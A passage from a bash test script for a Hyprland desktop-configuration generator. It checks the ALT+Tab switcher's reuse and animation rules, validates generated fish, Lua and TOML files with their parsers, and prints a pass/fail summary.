            lock_problems+="second ALT+Tab started a new switcher "
            lock_problems+="($(wc -l <"$lockdir/starts.txt") times)"$'\n'
        fi
        if [[ "$(cat "$lockdir/hyprsetup-switcher.queue" 2>/dev/null)" != "1" ]]; then
            lock_problems+="'advance selection' request not written to the counter: "
            lock_problems+="'$(cat "$lockdir/hyprsetup-switcher.queue" 2>/dev/null)'"$'\n'
        fi

        # If the user switched to another workspace: the old one must be closed
        # and a NEW one opened — not scrolling an invisible window.
        printf '6\n' >"$lockdir/ws.txt"
        XDG_RUNTIME_DIR="$lockdir" HYPRSETUP_PYTHON="$lockdir/noapp" \
            PATH="$lockdir/bin:/usr/bin:/bin" \
            python3 "$lockdir/windowswitch.py" >/dev/null 2>&1 &
        sleep 1.2
        if ! grep -q term "$lockdir/signals.txt" 2>/dev/null; then
            lock_problems+="switcher left on another workspace was not closed"$'\n'
        fi
        if [[ "$(wc -l <"$lockdir/starts.txt")" != "2" ]]; then
            lock_problems+="no fresh switcher opened on the new workspace"$'\n'
        fi
        kill "$first_pid" 2>/dev/null || true
        pkill -f "$lockdir/windowswitch.py" 2>/dev/null || true

        if [[ -n "$lock_problems" ]]; then
            fail "second ALT+Tab reuses the existing switcher" "$lock_problems"
        else
            pass "second ALT+Tab reuses the existing switcher (4 cases)"
        fi

        # The switcher must have NO opening animation. This check specifically
        # closes this trap: writing "animation none" keeps the config VALID,
        # but Hyprland ignores the unknown style name and falls back to the default
        # animation — i.e. the rule looks error-free while the animation stays.
        # The field that really disables it is "no_anim".
        anim_problems=""
        while IFS= read -r rules; do
            switcher_lines=$(grep 'hyprsetup\\.Switcher' "$rules" || true)
            if ! printf '%s' "$switcher_lines" | grep -q 'no_anim on'; then
                anim_problems+="${rules#"$TMP_ROOT/render/"}: 'no_anim on' missing"$'\n'
            fi
            if printf '%s' "$switcher_lines" | grep -q 'animation '; then
                anim_problems+="${rules#"$TMP_ROOT/render/"}: ineffective 'animation' "
                anim_problems+="rule used"$'\n'
            fi
        done < <(find "$TMP_ROOT/render" -name 'windowrules.conf' | sort | head -3)
        if [[ -n "$anim_problems" ]]; then
            fail "no opening animation in the ALT+Tab switcher" "$anim_problems"
        else
            pass "no opening animation in the ALT+Tab switcher"
        fi
    fi

    # fish is NOT POSIX: "export X=y", "$(...)", "[ ... ] && ..." are syntax
    # errors there. bash -n cannot validate these files, so the real fish
    # interpreter is used (--no-execute only parses).
    if command -v fish >/dev/null 2>&1; then
        fish_bad=""
        fish_count=0
        while IFS= read -r f; do
            fish_count=$((fish_count + 1))
            out=$(fish --no-execute "$f" 2>&1) \
                || fish_bad+="${f#"$TMP_ROOT/render/"}: $out"$'\n'
        done < <(find "$TMP_ROOT/render" -name '*.fish' | sort)
        if [[ -n "$fish_bad" ]]; then
            fail "generated fish files valid" "$fish_bad"
        elif ((fish_count)); then
            pass "generated fish files valid ($fish_count files)"
        fi
    else
        skip "generated fish files valid" "fish not installed"
    fi

    # Can the generated Lua files be parsed? There are two sources:
    #   · hyprland.lua / keybinds.lua in HYPR_LANG=lua mode
    #   · wezterm.lua when TERMINAL=wezterm is selected (WezTerm reads a script
    #     returning Lua, not plain key=value)
    # A template error does not stay silent here, but at runtime it invalidates the
    # whole file: WezTerm opens without config, and Hyprland does not start at all.
    lua_bin=""
    for cand in luac5.4 luac; do
        command -v "$cand" >/dev/null 2>&1 && { lua_bin="$cand"; break; }
    done
    if [[ -n "$lua_bin" ]]; then
        lua_bad=""
        lua_count=0
        while IFS= read -r f; do
            lua_count=$((lua_count + 1))
            out=$("$lua_bin" -p "$f" 2>&1) \
                || lua_bad+="${f#"$TMP_ROOT/render/"}: $out"$'\n'
        done < <(find "$TMP_ROOT/render" "$TMP_ROOT/render-lua" \
                      "$TMP_ROOT/render-bar" \
                      "$TMP_ROOT/render-axis" -name '*.lua' 2>/dev/null | sort)
        if [[ -n "$lua_bad" ]]; then
            fail "generated Lua files valid" "$lua_bad"
        elif ((lua_count)); then
            pass "generated Lua files valid ($lua_count files)"
        fi
    else
        skip "generated Lua files valid" "luac not installed"
    fi

    # Can the generated TOML files be parsed? (starship, hyprshade)
    toml_bad=""
    while IFS= read -r f; do
        python3 -c "
import tomllib, sys
try:
    tomllib.load(open(sys.argv[1], 'rb'))
except Exception as exc:
    print(exc); sys.exit(1)
" "$f" >/dev/null 2>&1 || toml_bad+="${f#"$TMP_ROOT/render/"}"$'\n'
    done < <(find "$TMP_ROOT/render" -name '*.toml' | sort)
    if [[ -n "$toml_bad" ]]; then
        fail "generated TOML valid" "$toml_bad"
    else
        pass "generated TOML valid"
    fi
elif want render; then
    group "Render matrix"
    skip "render matrix" "--quick"
fi

# ========================================================  summary  =========
printf '\n%s%s%s\n' "$B" "────────────────────────────────────────" "$R"
printf '%spassed%s %d   %sfailed%s %d   %sskipped%s %d\n' \
    "$GRN" "$R" "$PASS" "$RED" "$R" "$FAIL" "$YEL" "$R" "$SKIP"
if ((FAIL)); then
    printf '\n%sFailed checks:%s\n' "$RED$B" "$R"
    printf '  · %s\n' "${FAILED_NAMES[@]}"
    exit 1
fi
exit 0
